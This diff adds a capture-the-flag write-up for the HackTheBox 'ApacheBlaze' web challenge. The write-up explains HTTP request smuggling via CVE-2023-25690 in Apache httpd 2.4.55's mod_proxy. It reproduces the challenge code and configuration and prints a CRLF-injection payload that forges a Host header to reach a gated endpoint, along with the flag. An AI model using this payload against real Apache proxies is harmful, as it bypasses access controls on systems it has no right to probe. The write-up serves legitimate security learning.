@@ -1,0 +1,274 @@
+<p>cd im—
+layout: writeup
+categories:</p>
+<ul>
+  <li>writeup
+title: ApacheBlaze
+author: Jaak Weyrich
+date: 2023-11-08 01:10:05 +0200
+event: HackTheBox Web Challenges
+source: https://app.hackthebox.com/challenges
+solves: “365”
+ctf_categories:</li>
+  <li>web</li>
+  <li>Request Smuggling
+image: “img/thumbnail_image.png”
+—</li>
+</ul>
+
+<h2 id="description">Description</h2>
+<blockquote>
+  <p>Step into the ApacheBlaze universe, a world of arcade clicky games. Rumor has it that by playing certain games, you have the chance to win a grand prize. However, before you can dive into the fun, you’ll need to crack a puzzle.</p>
+  <h2 id="tldr">TL;DR</h2>
+  <p>Some <code class="language-plaintext highlighter-rouge">mod_proxy</code> configurations on Apache HTTP Server versions 2.4.0 through 2.4.55 allow a HTTP Request Smuggling attack.</p>
+</blockquote>
+
+<p>This is exploited in a frontend reverse proxy server to forge a request to a backend server.</p>
+
+<h2 id="complete-writeup">Complete Writeup</h2>
+<p>We are greeted with the screen below. Looks like the application lets us chose between a couple of games:
+<img src="img/thumbnail_image.png" alt="" />
+Before we look at specific code, let’s get a feeling for what we’re deeling with. The provided files look as follows:
+<img src="img/treeCommand.png" alt="" />
+There seems to be not that much code. The backend just has the <code class="language-plaintext highlighter-rouge">app.py</code> and then there is some frontend stuff involved. Let’s take a look at the <code class="language-plaintext highlighter-rouge">app.py</code> first:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+
+<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">GAMES</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">magic_click</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">click_mania</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">hyper_clicker</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">click_topia</span><span class="sh">'</span><span class="p">}</span>
+<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">FLAG</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">'</span><span class="s">HTB{f4k3_fl4g_f0r_t3st1ng}</span><span class="sh">'</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+    <span class="n">game</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">game</span><span class="sh">'</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">game</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span>
+            <span class="sh">'</span><span class="s">error</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">Empty game name is not supported!.</span><span class="sh">'</span>
+        <span class="p">}),</span> <span class="mi">400</span>
+
+    <span class="k">elif</span> <span class="n">game</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">GAMES</span><span class="sh">'</span><span class="p">]:</span>
+        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span>
+            <span class="sh">'</span><span class="s">error</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">Invalid game name!</span><span class="sh">'</span>
+        <span class="p">}),</span> <span class="mi">400</span>
+
+    <span class="k">elif</span> <span class="n">game</span> <span class="o">==</span> <span class="sh">'</span><span class="s">click_topia</span><span class="sh">'</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">X-Forwarded-Host</span><span class="sh">'</span><span class="p">)</span> <span class="o">==</span> <span class="sh">'</span><span class="s">dev.apacheblaze.local</span><span class="sh">'</span><span class="p">:</span>
+        <span class="c1">#if 'dev.apacheblaze.local' in request.headers.get('X-Forwarded-Host'):
+</span>            <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span>
+                <span class="sh">'</span><span class="s">message</span><span class="sh">'</span><span class="p">:</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">"</span><span class="s">FLAG</span><span class="sh">"</span><span class="p">]</span><span class="si">}</span><span class="sh">'</span>
+            <span class="p">}),</span> <span class="mi">200</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span>
+                <span class="sh">'</span><span class="s">message</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">This game is currently available only from dev.apacheblaze.local.</span><span class="sh">'</span>
+            <span class="p">}),</span> <span class="mi">200</span>
+
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span>
+            <span class="sh">'</span><span class="s">message</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">This game is currently unavailable due to internal maintenance.</span><span class="sh">'</span>
+        <span class="p">}),</span> <span class="mi">200</span>
+</code></pre></div></div>
+<p>From this backend code, the flag seems to be simply accessible by selecting the <code class="language-plaintext highlighter-rouge">click_topia</code> game while providing a specific <code class="language-plaintext highlighter-rouge">X-Forwarded-Host</code> header.
+Trying this doesn’t work unfortunately. Debugging shows that the X-Forwarded-Host header arriving at the backend looks as follows <code class="language-plaintext highlighter-rouge">dev.apacheblaze.local, localhost:1337, 127.0.0.1:8080</code>, indicating that my entry does reach it, but other entries are appended as well, causing the check to fail. Let’s remember this fact for later.
+Looking at the frontend code doesnt help much either, it is simply some index.html along with a pretty simple script in fetchAPI.js:</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nf">ready</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+  <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">.game a</span><span class="dl">"</span><span class="p">).</span><span class="nf">click</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">event</span><span class="p">.</span><span class="nf">preventDefault</span><span class="p">();</span>
+      <span class="kd">var</span> <span class="nx">gameName</span> <span class="o">=</span> <span class="nf">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nf">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">div</span><span class="dl">"</span><span class="p">);</span>
+
+      <span class="nx">$</span><span class="p">.</span><span class="nf">ajax</span><span class="p">({</span>
+          <span class="na">url</span><span class="p">:</span> <span class="dl">"</span><span class="s2">/api/games/</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">gameName</span><span class="p">,</span>
+          <span class="na">success</span><span class="p">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+              <span class="kd">var</span> <span class="nx">message</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">message</span><span class="p">;</span>
+              <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#gameplayresults</span><span class="dl">"</span><span class="p">).</span><span class="nf">text</span><span class="p">(</span><span class="nx">message</span><span class="p">);</span>
+          <span class="p">},</span>
+          <span class="na">error</span><span class="p">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+              <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#gameplayresults</span><span class="dl">"</span><span class="p">).</span><span class="nf">text</span><span class="p">(</span><span class="dl">"</span><span class="s2">Error fetching API data.</span><span class="dl">"</span><span class="p">);</span>
+          <span class="p">}</span>
+      <span class="p">});</span>
+  <span class="p">});</span>
+<span class="p">});</span>
+</code></pre></div></div>
+<p>Let’s take a look at what else there is to this web application and how it is configured.
+The <code class="language-plaintext highlighter-rouge">Dockerfile</code> reveals some pretty interesting stuff:</p>
+<div class="language-Dockerfile highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">FROM</span><span class="s"> alpine:3</span>
+
+<span class="c"># Install system packages</span>
+<span class="k">RUN </span>apk add <span class="nt">--no-cache</span> <span class="nt">--update</span> wget apr-dev apr-util-dev gcc libc-dev <span class="se">\
+</span>    pcre-dev make musl-dev
+
+<span class="c"># Download and extract httpd</span>
+<span class="k">RUN </span>wget https://archive.apache.org/dist/httpd/httpd-2.4.55.tar.gz <span class="o">&amp;&amp;</span> <span class="nb">tar</span> <span class="nt">-xvf</span> httpd-2.4.55.tar.gz
+
+<span class="k">WORKDIR</span><span class="s"> httpd-2.4.55</span>
+
+<span class="c"># Compile httpd with desired modules</span>
+<span class="k">RUN </span>./configure <span class="se">\
+</span>    <span class="nt">--prefix</span><span class="o">=</span>/usr/local/apache2 <span class="se">\
+</span>    <span class="nt">--enable-mods-shared</span><span class="o">=</span>all <span class="se">\
+</span>    <span class="nt">--enable-deflate</span> <span class="se">\
+</span>    <span class="nt">--enable-proxy</span> <span class="se">\
+</span>    <span class="nt">--enable-proxy-balancer</span> <span class="se">\
+</span>    <span class="nt">--enable-proxy-http</span> <span class="se">\
+</span>    <span class="o">&amp;&amp;</span> make <span class="se">\
+</span>    <span class="o">&amp;&amp;</span> make <span class="nb">install</span>
+
+<span class="c"># Move compiled httpd binary</span>
+<span class="k">RUN </span><span class="nb">mv </span>httpd /usr/local/bin
+
+<span class="k">WORKDIR</span><span class="s"> /</span>
+
+<span class="c"># Copy Apache config files</span>
+<span class="k">COPY</span><span class="s"> conf/httpd.conf /tmp/httpd.conf</span>
+<span class="k">RUN </span><span class="nb">cat</span> /tmp/httpd.conf <span class="o">&gt;&gt;</span> /usr/local/apache2/conf/httpd.conf
+
+<span class="c"># Can't bind to port 80</span>
+<span class="k">RUN </span><span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'/^Listen 80$/s/^/#/'</span> /usr/local/apache2/conf/httpd.conf
+
+<span class="c"># Copy challenge files</span>
+<span class="k">COPY</span><span class="s"> challenge/frontend/src/. /usr/local/apache2/htdocs/</span>
+<span class="k">RUN </span><span class="nb">mkdir</span> /app
+
+<span class="c"># Copy application and configuration files</span>
+<span class="k">COPY</span><span class="s"> conf/. /app</span>
+<span class="k">COPY</span><span class="s"> challenge/backend/src/. /app</span>
+
+<span class="c"># Install Python dependencies</span>
+<span class="k">RUN </span>apk add <span class="nt">--update</span> <span class="nt">--no-cache</span> <span class="se">\
+</span>    g++ <span class="se">\
+</span>    python3 <span class="se">\
+</span>    python3-dev <span class="se">\
+</span>    build-base <span class="se">\
+</span>    linux-headers <span class="se">\
+</span>    py3-pip <span class="se">\
+</span>    <span class="o">&amp;&amp;</span> pip <span class="nb">install</span> <span class="nt">-I</span> <span class="nt">--no-cache-dir</span> <span class="nt">-r</span> /app/requirements.txt
+
+<span class="c"># Add a system user and group</span>
+<span class="k">RUN </span>addgroup <span class="nt">-S</span> uwsgi-group <span class="o">&amp;&amp;</span> adduser <span class="nt">-S</span> <span class="nt">-G</span> uwsgi-group uwsgi-user
+
+<span class="c"># Fix permissions</span>
+<span class="k">RUN </span><span class="nb">chown</span> <span class="nt">-R</span> uwsgi-user:uwsgi-group /usr/local/apache2/logs <span class="se">\
+</span>    <span class="o">&amp;&amp;</span> <span class="nb">chmod </span>755 /usr/local/apache2/logs <span class="se">\
+</span>    <span class="o">&amp;&amp;</span> <span class="nb">touch</span> /usr/local/apache2/logs/error.log <span class="se">\
+</span>    <span class="o">&amp;&amp;</span> <span class="nb">chown </span>uwsgi-user:uwsgi-group /usr/local/apache2/logs/error.log <span class="se">\
+</span>    <span class="o">&amp;&amp;</span> <span class="nb">chmod </span>644 /usr/local/apache2/logs/error.log
+
+<span class="c"># Switch user to uwsgi-user</span>
+<span class="k">USER</span><span class="s"> uwsgi-user</span>
+
+<span class="c"># Expose Apache's port</span>
+<span class="k">EXPOSE</span><span class="s"> 1337</span>
+
+<span class="c"># Run httpd and uwsgi</span>
+<span class="k">CMD</span><span class="s"> ["sh", "/app/uwsgi/start_uwsgi.sh"]</span>
+</code></pre></div></div>
+
+<p>It downloads httpd (Apache HTTP Server) version 2.4.55 and compiles it with a list of modules. We got a version number, let’s google for vulnerabilities. This reveals the following URL, with an HTTP Request Splitting/Smuggling vulnerability right at the top, relevant to the version the server is running on.
+https://httpd.apache.org/security/vulnerabilities_24.html
+The description of the vulnerability (CVE-2023-25690) states that certain modules have to be used and have to be configured in a certain way for the vulnerability to be present.
+<img src="img/ApacheHTTPServerVulnerabilities.png" alt="" />
+Checking the <code class="language-plaintext highlighter-rouge">httpd.conf</code> file, we can see that the server is actually set up with some sort of multi-layer architecture, using one reverse proxy, one load balancing proxy and 2 backends; this proxy/backend architecture points to the request smuggling vulnerability mentioned above. Taking a closer look, one can even identify the specified module (<code class="language-plaintext highlighter-rouge">mod_proxy</code>) and recognize the pattern (marked in the above screenshot) along with the necessary RewriteRule for the vulnerability to apply:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ServerName _
+ServerTokens Prod
+ServerSignature Off
+
+Listen 8080
+Listen 1337
+
+ErrorLog "/usr/local/apache2/logs/error.log"
+CustomLog "/usr/local/apache2/logs/access.log" common
+
+LoadModule rewrite_module modules/mod_rewrite.so
+LoadModule proxy_module modules/mod_proxy.so
+LoadModule proxy_http_module modules/mod_proxy_http.so
+LoadModule proxy_balancer_module modules/mod_proxy_balancer.so
+LoadModule slotmem_shm_module modules/mod_slotmem_shm.so
+LoadModule lbmethod_byrequests_module modules/mod_lbmethod_byrequests.so
+
+&lt;VirtualHost *:1337&gt;
+
+    ServerName _
+
+    DocumentRoot /usr/local/apache2/htdocs
+
+    RewriteEngine on
+
+    RewriteRule "^/api/games/(.*)" "http://127.0.0.1:8080/?game=$1" [P]
+    ProxyPassReverse "/" "http://127.0.0.1:8080:/api/games/"
+
+&lt;/VirtualHost&gt;
+
+&lt;VirtualHost *:8080&gt;
+
+    ServerName _
+
+    ProxyPass / balancer://mycluster/
+    ProxyPassReverse / balancer://mycluster/
+
+    &lt;Proxy balancer://mycluster&gt;
+        BalancerMember http://127.0.0.1:8081 route=127.0.0.1
+        BalancerMember http://127.0.0.1:8082 route=127.0.0.1
+        ProxySet stickysession=ROUTEID
+        ProxySet lbmethod=byrequests
+    &lt;/Proxy&gt;
+
+&lt;/VirtualHost&gt;
+
+</code></pre></div></div>
+<p>Okay, looks like we have found ourselves a vulnerability, now onto exploiting it. Unfortunately, apache.org (nor any resource it points to) does not describe how to exploit the vulnerability exactly.
+A quick google search for a proof of concept for the vulnerability CVE-2023-25690 reveals a github repository that has everything we need:
+https://github.com/dhmosfunk/CVE-2023-25690-POC
+Injecting <code class="language-plaintext highlighter-rouge">\r\n\r\n</code> enables splitting the HTTP request and now lets us send new ones from the reverse proxy server. Before we get into the details of the payload, let’s understand what the flow of HTTP requests is exactly:</p>
+<ul>
+  <li>Our initial request to <code class="language-plaintext highlighter-rouge">GET /api/games/click_topia</code> is being processed by the reverse proxy running on port 1337. Here, the <code class="language-plaintext highlighter-rouge">mod_proxy</code> module is enabled and used for handling the request (indicated by the <code class="language-plaintext highlighter-rouge">[P]</code> in the line of the rewrite rule) and the rewrite rule rewrites <code class="language-plaintext highlighter-rouge">"^/api/games/(.*)"</code> to <code class="language-plaintext highlighter-rouge">"http://127.0.0.1:8080/?game=$1"</code>, meaning a request to <code class="language-plaintext highlighter-rouge">/api/games/anything</code> becomes <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8080/?game=anything</code>. The latter pattern also matches the endpoint in the backend much better. This request is now forwarded to the load balancing proxy running on port 8080.</li>
+  <li>The load balancing proxy receives the request and will forward it to either backend (either on port 8081 or 8082), depending on the current load and the <code class="language-plaintext highlighter-rouge">lbmethod</code> directive, but this detail does not matter that much in this case.</li>
+  <li>The backend receives the request and in case the request is made to <code class="language-plaintext highlighter-rouge">/?game=click_topia</code>, it will check for <code class="language-plaintext highlighter-rouge">dev.apacheblaze.local</code> being present in which case the flag will be returned.</li>
+</ul>
+
+<p>Now, it turns out that:</p>
+<blockquote>
+  <p>When acting in a reverse-proxy mode (using the <code class="language-plaintext highlighter-rouge">ProxyPass</code> directive, for example), <code class="language-plaintext highlighter-rouge">mod_proxy_http</code> adds several request headers in order to pass information to the origin server. These headers are: […] X-Forwarded-Host: The original host requested by the client in the <code class="language-plaintext highlighter-rouge">Host</code> HTTP request header.</p>
+</blockquote>
+
+<p>This explains why there were other entries in the X-Forwarded-Host header, appended to the one I gave in my first attempt. Both the reverse proxy (port 1337) and the load balancing proxy (port 8080) were acting in a reverse-proxy mode using the ProxyPass directive, making them append the <code class="language-plaintext highlighter-rouge">Host</code>header in the request the got to the request they forwarded. I.e. I appended <code class="language-plaintext highlighter-rouge">dev.apacheblaze.local</code> as X-Forwarded-For, requesting the reverse proxy with Host <code class="language-plaintext highlighter-rouge">localhost:1337</code>, which was appended by the reverse proxy to the request sent to the load balancing proxy with Host <code class="language-plaintext highlighter-rouge">127.0.0.1:8080</code>, in turn appended by the load balancing proxy in his request to the backend. Now the X-Forwarded-Host header has 3 entries…</p>
+
+<p>Knowing this, I can craft a payload. The first line of a normal http request to the click_topia /game endpoint would look like this:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /api/games/click_topia HTTP/1.1
+Host: localhost:1337
+...[other headers]...
+Connection: close
+
+
+</code></pre></div></div>
+<p>Mine now looks like this (note the url encoded <code class="language-plaintext highlighter-rouge">\r\n</code> as <code class="language-plaintext highlighter-rouge">%0d%0a</code>):</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/abc HTTP/1.1
+Host: localhost:1337
+...[other headers]...
+Connection: close
+
+
+</code></pre></div></div>
+<p>The reverse proxy server receiving my initial request, using the rewrite rule, splits this up into two separate http requests:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /api/games/click_topia HTTP/1.1
+Host: dev.apacheblaze.local
+
+
+GET /abc HTTP/1.1
+Host: localhost:1337
+...[other headers]...
+Connection: close
+</code></pre></div></div>
+<p>These requests are now forwarded to the load balancing proxy (I will receive the response for the first request), the load balancing proxy appends the <code class="language-plaintext highlighter-rouge">Host</code> header (<code class="language-plaintext highlighter-rouge">dev.apacheblaze.local</code>) of the request as <code class="language-plaintext highlighter-rouge">X-Forwarded_Host</code> header, this is sent to the backend and the check is passed.
+<img src="img/burpPayloadFlagScreenshot.png" alt="" />
+<code class="language-plaintext highlighter-rouge">HTB{1t5_4ll_4b0ut_Th3_Cl1ck5}</code></p>
+<h2 id="final-solution">Final Solution</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/abc HTTP/1.1
+Host: localhost:1337
+...[other headers]...
+Connection: close
+
+
+</code></pre></div></div>
+
+<h2 id="lessons-learned">Lessons learned</h2>
+<p>I learned quite something about apache httpd and its different configurations regarding proxies. The challenge also was a refresher for some request smuggling concepts.</p>
